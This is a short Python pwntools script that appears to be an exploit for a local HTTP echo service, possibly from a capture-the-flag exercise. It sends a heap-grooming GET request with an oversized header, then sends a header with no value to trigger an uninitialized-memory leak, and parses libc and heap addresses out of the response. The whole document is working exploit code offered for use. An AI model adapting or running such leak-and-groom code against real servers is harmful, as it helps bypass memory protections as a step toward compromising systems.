from pwn import * 
p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

attack_string = b"Header" + b"C" * 0x2000 # Grooming
string = b"GET /echo?A=B&type=header&key=" + attack_string + b"&location=body HTTP/1.1"

p.sendline(string) 

#string += "NewHeader" + "A" * 0x800 + ":NewValue\r\n" # Grooming the heap
string = attack_string  # Head without value - uninitialized memory leak bug
p.sendline(string)
p.sendline(b"")


## Parse the response AND leak
first_line = p.recvline()
first_header = str(p.recvline())

print(first_header)
#length_of_body = int(first_header.split(':')[1])
blank =  p.recvline() # Split
body = p.recvn(16400) 

'''
Uninitialized memory is in the 'value' of the header
'''
value = body.split(b':')[1]

#0x7ffff7fb0280
#0x55555555e220
libc_leak = u64(value[0:8])
heap_leak = u64(value[16:24])
print(hex(libc_leak))
print(hex(heap_leak))
